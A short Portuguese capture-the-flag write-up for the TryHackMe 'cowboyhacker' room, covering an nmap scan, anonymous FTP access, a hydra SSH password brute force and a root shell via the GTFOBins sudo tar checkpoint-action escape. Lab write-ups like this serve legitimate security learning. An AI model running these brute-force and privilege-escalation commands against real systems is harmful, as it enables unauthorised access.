https://tryhackme.com/r/room/cowboyhacker

Primeiramente iniciamos com um nmap
```
nmap -sV [IP]
```
Com isso descobrimos 3 portas abertas
![[Pasted image 20240828080823.png]]
E para entrar o ftp precisamos fazer
```
ftp [IP]
```
E para logar iremos, logar com o **anonymous**
E com isso temos acesso a 2 arquivos e podemos baixar passa nossa maquina com o **get**

No arquivo **task.txt** achamos um nick que pode ser usado no login do ssh
No arquivo **locks.txt** achamos varias senhas que podem ser utilizados no hydra para fazer o brute force

Utilizando o hydra para o brute force
```
hydra -l lin -P locks.txt ssh://10.10.196.217
```

Com isso temos acesso a senha e ela é:
![[Pasted image 20240828081152.png]]

Após isso podemos logar no ssh
```
ssh [user]@[IP]
```

E pegamos a primeira flag user.txt

E precisamos achar a outra, mas temos que escalar privilegio
```
sudo -l
```
Podemos descobrir executaveis que podem ser rodar sem root e achamos o **bin/tar**
Indo no site gtfobins podemos procurar para escalar privilegio
```
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
Com isso escalamos privilegio e temos a flag **root.txt**